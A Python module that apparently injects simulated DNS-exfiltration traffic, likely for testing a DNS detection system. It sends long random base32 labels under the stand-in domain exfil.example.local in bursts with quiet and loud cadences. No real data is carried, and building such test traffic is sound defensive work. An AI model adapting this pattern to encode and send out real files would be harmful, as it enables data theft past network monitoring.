"""DNS data-exfiltration injector (MITRE T1048.003 — Exfiltration over DNS).

The exfil fingerprint is **big payloads, fewer queries**: each lookup packs one
very long base32 *data label* (the encoded file chunk) under a drop domain, on a
sustained cadence. Long encoded labels — not subdomain fan-out — is what marks it
out from the tunnelling injector. Runs as an organic campaign.
"""

from __future__ import annotations

import logging
import threading

import dns.resolver

from ._campaign import new_rng, run_campaign

LOG = logging.getLogger("attack.dns_exfil")
_B32 = "abcdefghijklmnopqrstuvwxyz234567"
EXFIL_BASE = "exfil.example.local"


def _chunk(rng) -> str:
    # One long encoded data label (the exfiltrated file chunk).
    return "".join(rng.choice(_B32) for _ in range(rng.randint(40, 52)))


def run(server_ip: str, stop_event: threading.Event) -> None:
    rng = new_rng()
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [server_ip]
    resolver.timeout = 2.0
    resolver.lifetime = 3.0

    def burst(intensity: str) -> None:
        # Few-but-huge queries per burst -> low unique count, very long labels.
        n = rng.randint(3, 6) if intensity == "loud" else rng.randint(1, 2)
        for _ in range(n):
            qname = f"{_chunk(rng)}.{EXFIL_BASE}"
            try:
                resolver.resolve(qname, "A")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                    dns.resolver.NoNameservers, dns.exception.Timeout):
                pass
        # Sustained rate: short gaps between bursts to keep the bytes flowing.
        stop_event.wait(rng.uniform(0.4, 1.2) if intensity == "loud" else rng.uniform(4.0, 8.0))

    LOG.warning("DNS exfiltration injector active (long data labels, organic campaign)")
    run_campaign(rng, stop_event, burst)
